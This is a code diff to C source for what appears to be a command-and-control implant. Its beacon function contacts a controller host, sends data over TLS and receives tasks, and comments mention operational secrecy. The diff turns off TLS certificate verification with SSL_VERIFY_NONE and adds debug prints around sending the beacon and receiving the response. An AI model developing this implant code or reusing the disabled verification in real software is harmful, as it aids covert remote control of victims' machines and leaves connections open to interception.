@@ -131,6 +131,9 @@ static aegis_result_t tls_connect(tls_conn_t *conn, const char *host,
   /* Force TLS 1.3 minimum */
   SSL_CTX_set_min_proto_version(conn->ssl_ctx, TLS1_3_VERSION);
 
+  /* Disable verification for testing (self-signed certs) */
+  SSL_CTX_set_verify(conn->ssl_ctx, SSL_VERIFY_NONE, NULL);
+
   /* Disable session caching (OPSEC: prevents session ticket disclosure) */
   SSL_CTX_set_session_cache_mode(conn->ssl_ctx, SSL_SESS_CACHE_OFF);
 
@@ -461,14 +464,17 @@ aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
     }
   }
 
+  printf(" [!] Sending beacon to %s:%u...\n", ctx->primary_host, ctx->primary_port);
   ssize_t sent = tls_send(&conn, http_buf, http_len);
   free(http_buf);
 
   if (sent < 0) {
+    printf(" [!] Send failed.\n");
     tls_disconnect(&conn);
     ctx->consecutive_failures++;
     return AEGIS_ERR_NETWORK;
   }
+  printf(" [!] Beacon sent (%zd bytes).\n", sent);
 
   /* Receive response */
   uint8_t resp_buf[AEGIS_C2_MAX_PAYLOAD_SIZE];
@@ -481,10 +487,12 @@ aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
     if (resp_total >= sizeof(resp_buf))
       break;
   }
+  printf(" [!] Received response (%zu bytes).\n", resp_total);
 
   tls_disconnect(&conn);
 
   if (resp_total == 0) {
+    printf(" [!] Empty response.\n");
     ctx->consecutive_failures++;
     return AEGIS_ERR_NETWORK;
   }
